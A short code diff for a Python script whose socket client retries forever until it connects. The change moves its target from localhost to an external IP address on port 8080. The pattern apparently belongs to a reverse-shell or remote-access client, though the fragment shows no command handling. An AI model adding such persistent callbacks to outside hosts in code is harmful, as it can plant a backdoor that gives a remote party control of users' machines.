@@ -6,7 +6,7 @@ def main():
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     while True:
-        if client.connect_ex(("127.0.0.1", 8080)):
+        if client.connect_ex(("194.87.235.98", 8080)):
             pass
         else:
             while True:
